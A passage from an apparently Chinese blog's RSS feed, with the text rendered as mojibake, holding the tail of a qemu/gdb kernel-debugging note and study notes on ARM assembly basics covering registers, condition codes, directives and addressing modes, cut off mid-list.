&lt;p>&lt;code>gdb tcp::1234&lt;/code> è®¾ç½®gdbçš„è°ƒè¯•ç«¯å£ä¸º1234 åœ¨GDBä¸­é€šè¿‡ target remote localhist:1234è¿›è¡Œè¿æ¥&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="é©±åŠ¨">é©±åŠ¨&lt;/h3>
&lt;p>&lt;code>insmod&lt;/code> åŠ è½½é©±åŠ¨&lt;/p>
&lt;p>&lt;code>rmmod&lt;/code> å¸è½½é©±åŠ¨&lt;/p>
&lt;p>&lt;code>lsmod&lt;/code> æŸ¥çœ‹åŠ è½½äº†çš„é©±åŠ¨&lt;/p>
&lt;h3 id="è°ƒè¯•æµ‹è¯•">è°ƒè¯•æµ‹è¯•&lt;/h3>
&lt;p>qemuå¯åŠ¨ï¼Œå¯åŠ¨åçš„ç•Œé¢&lt;/p>
&lt;p>&lt;img src="https://my-md.oss-cn-shenzhen.aliyuncs.com/20190828162012.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>å¯åŠ¨GDB&lt;/p>
&lt;p>&lt;img src="https://my-md.oss-cn-shenzhen.aliyuncs.com/20190828164008.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md.oss-cn-shenzhen.aliyuncs.com/20190828164103.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>ä½¿ç”¨å†…æ ¸æä¾›çš„GDBè¾…åŠ©è°ƒè¯•åŠŸèƒ½ï¼š(gdb)apropos lx&lt;/p>
&lt;p>è°ƒè¯•å†…æ ¸æ¨¡å—ï¼šadd-symbol-file æ·»åŠ æ¨¡å—æ–‡ä»¶&lt;/p>
&lt;p>æ–­ç‚¹æµ‹è¯• &lt;code>b cmdline_proc_show&lt;/code>&lt;/p>
&lt;p>&lt;code>cat /proc/cmdline&lt;/code> è§¦å‘æ–­ç‚¹&lt;/p>
&lt;h3 id="å¼•ç”¨">å¼•ç”¨&lt;/h3></description></item><item><title>ARMæ±‡ç¼–åŸºç¡€(å¾…è¡¥å……)</title><link>https://ykiko.top/p/arm%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%BE%85%E8%A1%A5%E5%85%85/</link><pubDate>Sat, 10 Aug 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/arm%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%BE%85%E8%A1%A5%E5%85%85/</guid><description>&lt;h1 id="armæ±‡ç¼–åŸºç¡€å¾…è¡¥å……">ARMæ±‡ç¼–åŸºç¡€(å¾…è¡¥å……)&lt;/h1>
&lt;h2 id="armæ±‡ç¼–åŸºç¡€ç®€">ARMæ±‡ç¼–åŸºç¡€(ç®€)&lt;/h2>
&lt;p>ç»å¸¸å¿˜è®°ï¼Œåšä¸ªç¬”è®°ï¼Œå¥½ä½œå¤ä¹ ã€‚ã€‚&lt;/p>
&lt;p>å†…å®¹ä¸»è¦æ¥æºäºã€ŠAndroidè½¯ä»¶å®‰å…¨ä¸é€†å‘åˆ†æã€‹å’Œã€Šé€†å‘å·¥ç¨‹æƒå¨æŒ‡å—ã€‹ä»¥åŠ &lt;a class="link" href="https://www.anquanke.com/post/id/86383" target="_blank" rel="noopener"
>ARM æ±‡ç¼–&lt;/a> å’Œ&lt;a class="link" href="https://azeria-labs.com/writing-arm-assembly-part-1/" target="_blank" rel="noopener"
>Azeria-labs&lt;/a>&lt;/p>
&lt;h3 id="armæ¶æ„">ARMæ¶æ„&lt;/h3>
&lt;p>ARMå±äºRISC CPUï¼Œ&lt;/p>
&lt;ul>
&lt;li>
&lt;p>ARMæ¨¡å¼ 4ä¸ªå­—èŠ‚opcode 32ä½&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Thumbæ¨¡å¼ 2ä¸ªå­—èŠ‚opcode 16ä½&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Thumb-2æ¨¡å¼ åŒä¸Šï¼ˆåªæ˜¯æœ‰éƒ¨åˆ†4ä¸ªå­—èŠ‚çš„opcode)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>64ä½ARM 4ä¸ªå­—èŠ‚opcode&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ARMæœºå™¨ç åœ¨ç‰ˆæœ¬3ä¹‹å‰æ˜¯å°ç«¯ã€‚ä½†æ˜¯ä¹‹åé»˜è®¤é‡‡ç”¨å¤§ç«¯æ ¼å¼ï¼Œä½†å¯ä»¥è®¾ç½®åˆ‡æ¢åˆ°å°ç«¯ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810112415.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="æ•°æ®ç±»å‹">æ•°æ®ç±»å‹&lt;/h3>
&lt;p>æ•°æ®ç±»å‹åœ¨æ±‡ç¼–è¯­è¨€ä¸­çš„æ‰©å±•åç¼€ä¸º**-h&lt;strong>æˆ–è€…&lt;/strong>-sh&lt;strong>å¯¹åº”ç€åŠå­—ï¼Œ&lt;/strong>-b&lt;strong>æˆ–è€…&lt;/strong>-sb**å¯¹åº”ç€å­—èŠ‚ï¼Œä½†æ˜¯å¯¹äºå­—å¹¶æ²¡æœ‰å¯¹åº”çš„æ‰©å±•&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810113108.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">ldr = åŠ è½½å­—ï¼Œå®½åº¦å››å­—èŠ‚
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ldrh = åŠ è½½æ— ç¬¦å·çš„åŠå­—ï¼Œå®½åº¦ä¸¤å­—èŠ‚
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ldrsh = åŠ è½½æœ‰ç¬¦å·çš„åŠå­—ï¼Œå®½åº¦ä¸¤å­—èŠ‚
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ldrb = åŠ è½½æ— ç¬¦å·çš„å­—èŠ‚
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ldrsb = åŠ è½½æœ‰ç¬¦å·çš„å­—èŠ‚
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">str = å­˜å‚¨å­—ï¼Œå®½åº¦å››å­—èŠ‚
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">strh = å­˜å‚¨æ— ç¬¦å·çš„åŠå­—ï¼Œå®½åº¦ä¸¤å­—èŠ‚
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">strsh = å­˜å‚¨æœ‰ç¬¦å·çš„åŠå­—ï¼Œå®½åº¦ä¸¤å­—èŠ‚
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">strb = å­˜å‚¨æ— ç¬¦å·çš„å­—èŠ‚
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">strsb = å­˜å‚¨æœ‰ç¬¦å·çš„å­—èŠ‚
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="å­—èŠ‚åº">å­—èŠ‚åº&lt;/h3>
&lt;p>åœ¨å†…å­˜ä¸­æœ‰ä¸¤ç§å­—èŠ‚æ’å¸ƒé¡ºåºï¼Œå¤§ç«¯åº(BE)æˆ–è€…å°ç«¯åº(LE)ã€‚ä¸¤è€…çš„ä¸»è¦ä¸åŒæ˜¯å¯¹è±¡ä¸­çš„æ¯ä¸ªå­—èŠ‚åœ¨å†…å­˜ä¸­çš„å­˜å‚¨é¡ºåºå­˜åœ¨å·®å¼‚ã€‚ä¸€èˆ¬X86ä¸­æ˜¯å°ç«¯åºï¼Œæœ€ä½çš„å­—èŠ‚å­˜å‚¨åœ¨æœ€ä½çš„åœ°å€ä¸Šã€‚åœ¨å¤§ç«¯æœºä¸­æœ€é«˜çš„å­—èŠ‚å­˜å‚¨åœ¨æœ€ä½çš„åœ°å€ä¸Šã€‚&lt;/p>
&lt;p>&lt;img src="https://p0.ssl.qhimg.com/t01b6d7f41b02b0a58d.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>æ•°æ®è®¿é—®æ—¶é‡‡å–å¤§ç«¯åºè¿˜æ˜¯å°ç«¯åºä½¿ç”¨ç¨‹åºçŠ¶æ€å¯„å­˜å™¨(CPSR)çš„ç¬¬9æ¯”ç‰¹ä½æ¥å†³å®šçš„ã€‚&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810120701.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="å¯„å­˜å™¨">å¯„å­˜å™¨&lt;/h3>
&lt;p>37ä¸ª32ä½å¯„å­˜å™¨ï¼Œå…¶ä¸­31ä¸ªä¸ºåŸºç¡€å¯„å­˜å™¨ï¼Œ6ä¸ªä¸ºçŠ¶æ€å¯„å­˜å™¨ã€‚&lt;/p>
&lt;p>ç”¨æˆ·æ¨¡å¼ä¸‹æœ‰&lt;/p>
&lt;ul>
&lt;li>
&lt;p>ä¸åˆ†ç»„å¯„å­˜å™¨ï¼ˆR0-R7ï¼‰ R7ä¸€èˆ¬å­˜æ”¾ç³»ç»Ÿè°ƒç”¨å·&lt;/p>
&lt;/li>
&lt;li>
&lt;p>åˆ†ç»„å¯„å­˜å™¨ï¼ˆR8-R14ï¼‰&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç¨‹åºè®¡æ•°å™¨ï¼ˆR15ï¼‰&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å•å‰ç¨‹åºçŠ¶æ€å¯„å­˜å™¨ï¼ˆCPSRï¼‰&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>ä¸¤ç§çŠ¶æ€ï¼š&lt;/p>
&lt;table>
&lt;tr>
&lt;th>ARMçŠ¶æ€ï¼ˆ32ä½å¯¹é½ï¼‰&lt;/th>
&lt;th>ThumbçŠ¶æ€(16ä½å¯¹é½)&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>R0-R7&lt;/th>
&lt;th>R0-R7(ç›¸åŒ)&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>CPSR&lt;/th>
&lt;th>CPSRï¼ˆåŒï¼‰&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>R11&lt;/th>
&lt;th>FPï¼ˆæ ˆå¸§æŒ‡é’ˆï¼‰&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>R12&lt;/th>
&lt;th>IPï¼ˆå†…éƒ¨ç¨‹åºè°ƒç”¨ï¼‰&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>R13&lt;/th>
&lt;th>SPï¼ˆæ ˆæŒ‡é’ˆï¼‰&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>R14&lt;/th>
&lt;th>LRï¼ˆé“¾æ¥å¯„å­˜å™¨ï¼‰ä¸€èˆ¬å­˜æ”¾å‡½æ•°è¿”å›åœ°å€&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>R15&lt;/th>
&lt;th>PCï¼ˆç¨‹åºè®¡æ•°å™¨ï¼‰&lt;/th>
&lt;/tr>&lt;/table>
&lt;p>å’Œx86å¯¹æ¯”ï¼š&lt;/p>
&lt;p>&lt;img src="https://p5.ssl.qhimg.com/t01a8e5d24fa91f9f0f.jpg"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>CSPR:&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810122226.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>32ä½çš„CPSRå¯„å­˜å™¨çš„æ¯”ç‰¹ä½å«ä¹‰ï¼Œå·¦è¾¹æ˜¯æœ€å¤§æ¯”ç‰¹ä½ï¼Œå³è¾¹æ˜¯æœ€å°æ¯”ç‰¹ä½ã€‚æ¯ä¸ªå•å…ƒä»£è¡¨ä¸€ä¸ªæ¯”ç‰¹ã€‚&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810122258.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;table>
&lt;tr>
&lt;th>æ¡ä»¶ç &lt;/th>
&lt;th>åŠ©è®°ç¬¦åç¼€&lt;/th>
&lt;th>æ ‡å¿—&lt;/th>
&lt;th>å«ä¹‰&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>0000&lt;/th>
&lt;th>EQ&lt;/th>
&lt;th>Zç½®ä½&lt;/th>
&lt;th>ç›¸ç­‰&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>0001&lt;/th>
&lt;th>NE&lt;/th>
&lt;th>Zæ¸…é›¶&lt;/th>
&lt;th>ä¸ç›¸ç­‰&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>0010&lt;/th>
&lt;th>CS&lt;/th>
&lt;th>Cç½®ä½&lt;/th>
&lt;th>æ— ç¬¦å·æ•°å¤§äºæˆ–ç­‰äº&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>0011&lt;/th>
&lt;th>CC&lt;/th>
&lt;th>Cæ¸…é›¶&lt;/th>
&lt;th>æ— ç¬¦å·æ•°å°äº&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>0100&lt;/th>
&lt;th>MI&lt;/th>
&lt;th>Nç½®ä½&lt;/th>
&lt;th>è´Ÿæ•°&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>0101&lt;/th>
&lt;th>PL&lt;/th>
&lt;th>Næ¸…é›¶&lt;/th>
&lt;th>æ­£æ•°æˆ–é›¶&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>0110&lt;/th>
&lt;th>VS&lt;/th>
&lt;th>Vç½®ä½&lt;/th>
&lt;th>æº¢å‡º&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>0111&lt;/th>
&lt;th>VC&lt;/th>
&lt;th>Væ¸…é›¶&lt;/th>
&lt;th>æœªæº¢å‡º&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>1000&lt;/th>
&lt;th>HI&lt;/th>
&lt;th>Cç½®ä½Zæ¸…é›¶&lt;/th>
&lt;th>æ— ç¬¦å·æ•°å¤§äº&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>1001&lt;/th>
&lt;th>LS&lt;/th>
&lt;th>Cæ¸…é›¶Zç½®ä½&lt;/th>
&lt;th>æ— ç¬¦å·æ•°å°äºæˆ–ç­‰äº&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>1010&lt;/th>
&lt;th>GE&lt;/th>
&lt;th>Nç­‰äºV&lt;/th>
&lt;th>å¸¦ç¬¦å·æ•°å¤§äºæˆ–ç­‰äº&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>1011&lt;/th>
&lt;th>LT&lt;/th>
&lt;th>Nä¸ç­‰äºV&lt;/th>
&lt;th>å¸¦ç¬¦å·æ•°å°äº&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>1100&lt;/th>
&lt;th>GT&lt;/th>
&lt;th>Zæ¸…é›¶ä¸”ï¼ˆNç­‰äºVï¼‰&lt;/th>
&lt;th>å¸¦ç¬¦å·æ•°å¤§äº&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>1101&lt;/th>
&lt;th>LE&lt;/th>
&lt;th>Zç½®ä½æˆ–ï¼ˆNä¸ç­‰äºVï¼‰&lt;/th>
&lt;th>å¸¦ç¬¦å·æ•°å°äºæˆ–ç­‰äº&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>1110&lt;/th>
&lt;th>AL&lt;/th>
&lt;th>å¿½ç•¥&lt;/th>
&lt;th>æ— æ¡ä»¶æ‰§è¡Œ&lt;/th>
&lt;/tr>&lt;/table>
&lt;h3 id="ç¨‹åºç»“æ„">ç¨‹åºç»“æ„&lt;/h3>
&lt;p>Androidå¹³å°é‡‡ç”¨çš„æ˜¯GUN ARMæ±‡ç¼–æ ¼å¼ï¼Œæ±‡ç¼–å™¨ä¸ºGAS&lt;/p>
&lt;p>å‚æ•°ä¼ é€’ï¼šR0-R3è¿™4ä¸ªå¯„å­˜å™¨ç”¨æ¥ä¼ é€’å‡½æ•°è°ƒç”¨çš„ç¬¬1åˆ°4ä¸ªå‚æ•°ï¼Œè¶…å‡ºçš„å‚æ•°é€šè¿‡å †æ ˆæ¥ä¼ é€’ã€‚R0è¿˜ç”¨æ¥å­˜æ”¾å‡½æ•°è°ƒç”¨çš„è¿”å›å€¼ã€‚&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810112712.gif"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="æ±‡ç¼–å™¨æŒ‡ä»¤">æ±‡ç¼–å™¨æŒ‡ä»¤&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>.file&lt;/code>:æºæ–‡ä»¶å&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>.align&lt;/code>:ä»£ç å¯¹é½æ–¹å¼&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>.ascii&lt;/code>:å£°æ˜å­—ç¬¦ä¸²&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>.global&lt;/code>:å£°æ˜å…¨å±€ç¬¦å·&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>.type&lt;/code>ï¼šæŒ‡å®šç¬¦å·çš„ç±»å‹&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>.word&lt;/code>ï¼šå­˜æ”¾åœ°å€å€¼&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>.size&lt;/code>ï¼šè®¾ç½®æŒ‡å®šç¬¦å·çš„å¤§å°&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>.ident&lt;/code>ï¼šç¼–è¯‘å™¨æ ‡è¯†&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="å¯»å€æ–¹å¼">å¯»å€æ–¹å¼&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>ç«‹å³å¯»å€&lt;/p>
&lt;p>&lt;code>MOV R0, #1234&lt;/code> -&amp;gt;R0=1234&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¯„å­˜å™¨å¯»å€&lt;/p>
&lt;p>&lt;code>MOV R1 = R2&lt;/code> -&amp;gt;R0=R1&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¯„å­˜å™¨ç§»ä½å¯»å€&lt;/p>
&lt;ul>
&lt;li>
&lt;p>LSL ï¼šé€»è¾‘å·¦ç§»ï¼Œç§»ä½åå¯„å­˜å™¨ç©ºå‡ºçš„ä½ä½è¡¥0&lt;/p>
&lt;/li>
&lt;li>
&lt;p>LSRï¼šé€»è¾‘å³ç§»ï¼Œç§»ä½åå¯„å­˜å™¨ç©ºå‡ºçš„é«˜ä½è¡¥0&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ASRï¼šç®—æœ¯å³ç§»ï¼Œç§»ä½è¿‡ç¨‹ä¸­ç¬¦å·ä½ä¿æŒä¸å˜ï¼Œè‹¥æºæ“ä½œæ•°ä¸ºæ­£æ•°ï¼Œåˆ™ç§»ä½åç©ºå‡ºçš„é«˜ä½è¡¥0ï¼Œå¦åˆ™è¡¥1ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>RORï¼šå¾ªç¯å³ç§»ï¼Œç§»ä½åç§»å‡ºçš„ä½ä½å¡«å…¥ç§»ä½ç©ºå‡ºçš„é«˜ä½ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>RRXï¼šå¸¦æ‰©å±•çš„å¾ªç¯å³ç§»ï¼Œæ“ä½œæ•°å³ç§»ä¸€ä½ï¼Œç§»å‡ºçš„ç©ºä½ç”¨Cæ ‡å¿—çš„å€¼å¡«å……ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;code>MOV R0, R1, LSL #2&lt;/code> -&amp;gt;R1å·¦ç§»ä¸¤ä½ï¼ˆR1&amp;laquo;2ï¼‰èµ‹å€¼ç»™R0,ç›¸å½“äºR0 = R1*4&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¯„å­˜å™¨é—´æ¥å¯»å€&lt;/p>
&lt;p>&lt;code>LDR RO, [R1]&lt;/code> -&amp;gt;å°†R1å¯„å­˜å™¨çš„æ•°å€¼ä½œä¸ºåœ°å€ï¼Œå–å‡ºæ­¤åœ°å€ä¸­çš„å€¼èµ‹ç»™R0å¯„å­˜å™¨&lt;/p>
&lt;/li>
&lt;li>
&lt;p>åŸºå€å¯»å€&lt;/p>
&lt;p>å¤šç”¨äºæŸ¥è¡¨ã€æ•°ç»„è®¿é—®æ“ä½œã€‚&lt;/p>
&lt;p>&lt;code>LDR R0, [R1,#-4]&lt;/code> -&amp;gt;å°†R1å¯„å­˜å™¨çš„æ•°å€¼å‡4ä½œä¸ºåœ°å€ï¼Œå–å‡ºæ­¤åœ°å€çš„å€¼èµ‹ç»™R0å¯„å­˜å™¨ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¤šå¯„å­˜å™¨å¯»å€&lt;/p>
&lt;p>ä¸€æ¡æŒ‡ä»¤æœ€å¤šå®Œæˆ16ä¸ªé€šç”¨å¯„å­˜å™¨å€¼çš„ä¼ é€ã€‚&lt;/p>
&lt;p>&lt;code>LDMIA R0,{R1,R2,R3,R4}&lt;/code> -&amp;gt;LDMä¸ºæ•°æ®åŠ è½½æŒ‡ä»¤ï¼ŒæŒ‡ä»¤çš„åç¼€IAè¡¨ç¤ºæ¯æ¬¡æ‰§è¡Œå®ŒåŠ è½½æ“ä½œåR0å¯„å­˜å™¨çš„å€¼è‡ªå¢1ä¸ªå­—ï¼ŒARMæŒ‡ä»¤é›†ä¸­ï¼Œå­è¡¨ç¤ºçš„æ˜¯ä¸€ä¸ª32ä½æ•°å€¼ã€‚è¿™æ¡æŒ‡ä»¤ä½œç”¨ä¸ºï¼šR1 = [R0],R2 = [R0+#4],R3 = [R0+#8],R4 = [R0+#12]ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å †æ ˆå¯»å€&lt;/p>
&lt;p>ç‰¹å®šçš„æŒ‡ä»¤æ¥å®Œæˆï¼š&lt;code>LDMFA/STMFA&lt;/code>ã€&lt;code>LDMEA/STMEA&lt;/code>ã€&lt;code>LDMFD/STMFD&lt;/code>ã€&lt;code>LDMED/STMED&lt;/code>ã€‚&lt;/p>
&lt;p>LDMå’ŒSTMä¸ºæŒ‡ä»¤å‰ç¼€ï¼Œè¡¨ç¤ºå¤šå¯„å­˜å™¨å¯»å€ï¼Œå³ä¸€æ¬¡ä¼ é€å¤šä¸ªå¯„å­˜å™¨çš„å€¼ã€‚åé¢çš„åç¼€ä¸ºæŒ‡ä»¤åç¼€ã€‚&lt;/p>
&lt;p>&lt;code>STMFD SP!, {R1-R7,LR}&lt;/code> -&amp;gt;å°†R1~R7,LRå…¥æ ˆï¼Œå¤šç”¨äºä¿å­˜å­ç¨‹åºçš„ç°åœºã€‚&lt;/p>
&lt;p>&lt;code>LDMFD SP!, {R1-R7,LR}&lt;/code> -&amp;gt;å‡ºæ ˆï¼Œæ¢å¤ç°åœºã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å—æ‹·è´å¯»å€&lt;/p>
&lt;p>å®ç°ä»è¿ç»­åœ°å€æ•°æ®ä»å­˜å‚¨å™¨çš„æŸä¸€ä½ç½®æ‹·è´åˆ°å¦å¤–ä¸€ä¸ªä½ç½®ï¼ŒæŒ‡ä»¤æœ‰ï¼š&lt;code>LDMIA/STMIA&lt;/code>ã€&lt;code>LDMDA/STMDA&lt;/code>ã€&lt;code>LDMIB/STMIB&lt;/code>ã€&lt;code>LDMDB/STMDB&lt;/code>ã€‚&lt;/p>
&lt;p>&lt;code>LDMIA R0! {R0-R3}&lt;/code> ä»R0å¯„å­˜å™¨æŒ‡å‘çš„å­˜å‚¨å•å…ƒä¸­è¯»å–3ä¸ªå­—åˆ°R1-R3å¯„å­˜å™¨&lt;/p>
&lt;p>&lt;code>STMIA R0! {R0-R3}&lt;/code> å­˜å‚¨ä»R1-R3å¯„å­˜å™¨çš„å†…å®¹åˆ°R0å¯„å­˜å™¨æŒ‡å‘çš„å­˜å‚¨å•å…ƒ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç›¸å¯¹å¯»å€&lt;/p>
&lt;p>ä»¥ç¨‹åºè®¡æ•°å™¨PCçš„å½“å‰å€¼ä¸ºåŸºåœ°å€ï¼ŒæŒ‡ä»¤ä¸­çš„åœ°å€æ ‡å·ä½œä¸ºåç§»é‡ï¼Œå°†ä¸¤è€…ç›¸åŠ ä¹‹åå¾—åˆ°æ“ä½œæ•°çš„æœ‰æ•ˆåœ°å€ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">BL NEXT Â·Â·Â·Â·NEXT: Â·Â·Â·Â·Â·Â·Â·Â·
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="armå’ŒthumbæŒ‡ä»¤é›†">ARMå’ŒThumbæŒ‡ä»¤é›†&lt;/h3>
&lt;h3 id="åŸºæœ¬æŒ‡ä»¤ç®€è¿°">åŸºæœ¬æŒ‡ä»¤ç®€è¿°&lt;/h3>
&lt;p>&lt;code>MNEMONIC{S}{condition}Â {Rd},Â Operand1,Â Operand2&lt;/code>&lt;/p>
&lt;p>&lt;code>åŠ©è®°ç¬¦{æ˜¯å¦ä½¿ç”¨CPSR}{æ˜¯å¦æ¡ä»¶æ‰§è¡Œä»¥åŠæ¡ä»¶}Â {ç›®çš„å¯„å­˜å™¨},Â æ“ä½œç¬¦1,Â æ“ä½œç¬¦2&lt;/code>&lt;/p>
&lt;blockquote>
&lt;p>MNEMONICÂ Â Â Â Â -Â æŒ‡ä»¤çš„åŠ©è®°ç¬¦å¦‚ADD&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code>{S}Â Â Â Â Â Â Â Â Â Â  -Â å¯é€‰çš„æ‰©å±•ä½ï¼Œå¦‚æœæŒ‡ä»¤ååŠ äº†Sï¼Œåˆ™éœ€è¦ä¾æ®è®¡ç®—ç»“æœæ›´æ–°CPSRå¯„å­˜å™¨ä¸­çš„æ¡ä»¶è·³è½¬ç›¸å…³ çš„FLAG
{condition}Â Â  -Â å¦‚æœæœºå™¨ç è¦è¢«æ¡ä»¶æ‰§è¡Œï¼Œé‚£å®ƒéœ€è¦æ»¡è¶³çš„æ¡ä»¶æ ‡ç¤º
{Rd}Â Â Â Â Â Â Â Â Â  -Â å­˜å‚¨ç»“æœçš„ç›®çš„å¯„å­˜å™¨
Operand1Â Â Â Â Â -Â ç¬¬ä¸€ä¸ªæ“ä½œæ•°ï¼Œå¯„å­˜å™¨æˆ–è€…æ˜¯ä¸€ä¸ªç«‹å³æ•°
Operand2Â Â Â Â Â -Â ç¬¬äºŒä¸ª(å¯å˜çš„)æ“ä½œæ•°ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªç«‹å³æ•°æˆ–è€…å¯„å­˜å™¨æˆ–è€…æœ‰åç§»é‡çš„å¯„å­˜å™¨
&lt;/code>&lt;/pre>
&lt;p>ç¬¬äºŒæ“ä½œæ•°è¿˜æœ‰å¦‚ä¸‹æ“ä½œï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">#123 - ç«‹å³æ•°
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Rx - å¯„å­˜å™¨æ¯”å¦‚R1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Rx, ASR n - å¯¹å¯„å­˜å™¨ä¸­çš„å€¼è¿›è¡Œç®—æœ¯å³ç§»nä½åçš„å€¼
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Rx, LSL n - å¯¹å¯„å­˜å™¨ä¸­çš„å€¼è¿›è¡Œé€»è¾‘å·¦ç§»nä½åçš„å€¼
